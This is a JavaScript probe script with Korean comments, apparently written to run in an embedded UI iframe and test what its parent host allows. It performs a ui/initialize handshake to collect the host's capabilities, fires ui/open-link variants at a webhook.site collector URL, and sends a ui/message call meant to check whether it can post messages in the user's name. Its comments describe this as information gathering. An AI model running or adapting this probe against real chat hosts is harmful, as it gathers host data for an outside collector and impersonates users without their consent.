/*
 * round-2b probe — 핸드셰이크 먼저, 그 다음 액션
 * 가설: ui/open-link 등은 ui/initialize 핸드셰이크가 끝난 surface에만 honor될 수 있다.
 *       initialize 응답 자체가 surface capabilities를 드러낸다(정보 수집).
 */
(function () {
  "use strict";
  var COLLECTOR = "https://webhook.site/162f25bb-fb72-4708-8022-39d06dbc6144"; 
  var ENABLE_UI_MESSAGE = true; 

  var out = [];
  function log(k, v) { out.push([k, String(v)]); render(); }

  // 들어오는 모든 메시지 기록(initialize 응답/capabilities 포착이 핵심)
  window.addEventListener("message", function (e) {
    var who = e.source === window.parent ? "parent" : (e.source === window.top ? "top" : "other");
    log("<< " + e.origin + " [" + who + "]", JSON.stringify(e.data).slice(0, 700));
  }, false);

  function send(label, msg) {
    try { window.parent.postMessage(msg, "*"); log(">> " + label, JSON.stringify(msg).slice(0, 220)); }
    catch (e) { log(">> " + label + " THREW", e.name); }
  }
  var id = 0;
  function rpc(m, p) { return { jsonrpc: "2.0", id: ++id, method: m, params: p || {} }; }

  // 1) 핸드셰이크 시작
  send("ui/initialize", rpc("ui/initialize", {
    protocolVersion: "2025-06-18",
    capabilities: {},
    clientInfo: { name: "probe", version: "1" }
  }));

  // 2) 잠시 후: initialized + 액션(open-link 변형들)
  setTimeout(function () {
    send("ui/notifications/initialized", { jsonrpc: "2.0", method: "ui/notifications/initialized", params: {} });

    var u = COLLECTOR + "?p=openlink&ts=" + Date.now();
    // 파라미터/메서드명 변형을 모두 시도 (호스트가 기대하는 꼴이 뭔지 모르니)
    send("open-link {url}",  rpc("ui/open-link", { url: u }));
    send("open-link {href}", rpc("ui/open-link", { href: u }));
    send("open-link {link}", rpc("ui/open-link", { link: u }));
    send("ui/open-url {url}", rpc("ui/open-url", { url: u }));
    send("ui/openExternal",   rpc("ui/openExternal", { url: u }));
  }, 900);

  // 3) 더 뒤: ui/message (켜면 DM에 흔적)
  if (ENABLE_UI_MESSAGE) {
    setTimeout(function () {
      send("ui/message", rpc("ui/message", { text: "PROBE-" + Date.now() }));
      log("관찰", "테스트 DM에 PROBE-... 가 보이면 = 사용자 명의 전송 가능");
    }, 1800);
  }

  function esc(s) { return s.replace(/[&<>]/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]; }); }
  function render() {
    var rows = out.map(function (kv) {
      return "<tr><td style='color:#8ab;padding:2px 10px;vertical-align:top;white-space:nowrap'>" +
        esc(kv[0]) + "</td><td style='padding:2px 10px;word-break:break-all'>" + esc(kv[1]) + "</td></tr>";
    }).join("");
    var el = document.getElementById("__probe2b");
    if (!el) {
      el = document.createElement("div");
      el.id = "__probe2b";
      el.style.cssText = "position:fixed;inset:0;background:#0b0e14;color:#e6e6e6;overflow:auto;z-index:2147483647;padding:12px;font:12px/1.5 monospace";
      (document.body || document.documentElement).appendChild(el);
    }
    el.innerHTML = "<div style='font-weight:700;margin-bottom:8px'>round-2b: handshake + actions</div><table style='border-collapse:collapse'>" + rows + "</table>";
  }
  render();
  setTimeout(render, 3000);
})();
